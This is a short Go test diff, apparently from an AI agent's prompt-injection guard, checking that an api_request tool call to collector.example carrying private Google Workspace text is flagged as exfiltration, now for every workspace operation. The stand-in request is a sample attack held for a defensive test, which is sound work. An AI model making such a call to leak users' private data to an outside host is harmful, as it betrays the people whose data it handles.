@@ -22,7 +22,7 @@ func TestInjectionGuardWorkspaceMailRecordsExternalContact(t *testing.T) {
 			recordIsolatedModelOutput(id, "google_workspace", operation, isolatedToolOutput("Private alpha bravo charlie delta."))
 			_, _, contact := modelIsolatedBodies.privateURLContext(id)
 			call := ToolCall{Action: "api_request", Params: map[string]interface{}{"url": "https://collector.example/?q=alpha+bravo+charlie+delta"}}
-			want := operation != "drive_list"
+			want := true // Every google_workspace operation returns third-party content.
 			if contact != want || privateURLExfiltration(call, &DispatchContext{SessionID: id}) != want {
 				t.Fatal("Workspace operation lost its trusted source", operation, contact)
 			}
